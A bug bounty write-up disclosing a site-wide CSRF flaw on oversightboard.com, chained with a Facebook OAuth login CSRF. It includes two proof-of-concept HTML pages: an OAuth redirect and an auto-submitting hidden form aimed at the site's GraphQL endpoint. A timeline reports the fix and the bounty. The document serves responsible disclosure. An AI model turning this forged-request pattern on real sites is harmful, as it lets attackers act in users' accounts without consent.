---
id: 702
title: 'Oversightboard.com site-wide CSRF due to missing checking'
date: '2021-06-27T09:42:51+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=702'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

**Description**

This bug could allow an attacker to force a user in [Oversightboard.com](https://oversightboard.com/) who visited his website, to make certain requests which would allow the deleting, editing or creating of data. This is possible because the website [www.oversightboard.com](https://www.oversightboard.com/)  doesn’t implement any security measurements like special token or headers to prevent CSRF attacks. The attacker would first exploit a Login CSRF bug which would force a Facebook or Instagram logged-in user to login in the [www.oversightboard.com](https://www.oversightboard.com/) and then exploit the CSRF bug to make different actions.

**Details**

The attacker would host those scripts in his website (supposing the victim used oversightboard before so the login CSRF would work without user interaction):

**oversight.html**

```markup
<html>
<body>
<button onclick='window.open("oversight2.html","part2"); window.location.href = "<a href="https://www.facebook.com/v7.0/dialog/oauth?app_id=686247315210595&redirect_uri=https%3A%2F%2Fwww.oversightboard.com%2Flogin%2F&response_type=token" rel="noreferrer noopener" target="_blank">https://www.facebook.com/v7.0/dialog/oauth?app_id=686247315210595&redirect_uri=https%3A%2F%2Fwww.oversightboard.com%2Flogin%2F&response_type=token</a>";'>Start Attack</button>
</body>
</html>
```

**oversight2.html**

```markup
<html>
<body>
<form id="f" method="POST" action="<a href="https://www.oversightboard.com/graphql" rel="noreferrer noopener" target="_blank">https://www.oversightboard.com/graphql</a>">
<input type="hidden" name="access_token" value="OB|2532996643404788|d9537588db572ef75a00175799aeaebc"/>
<input type="hidden" name="__a" value="1"/>
<input type="hidden" name="doc_id" value="REDACTED"/>
<input type="hidden" name="variables" value='{"key":"val"}'/>
<noscript>
<input type="submit"/>
</noscript>
</form>
<script>setTimeout(function(){document.getElementById("f").submit();},4000);</script>
</body>
</html>
```

**Timeline**

Dec 26, 2020— Report Sent   
Jan 18, 2021— Acknowledged by Facebook  
Jan 29, 2021— Fixed by Facebook  
Jan 29, 2021 — $500 bounty awarded by Facebook.

</body></html>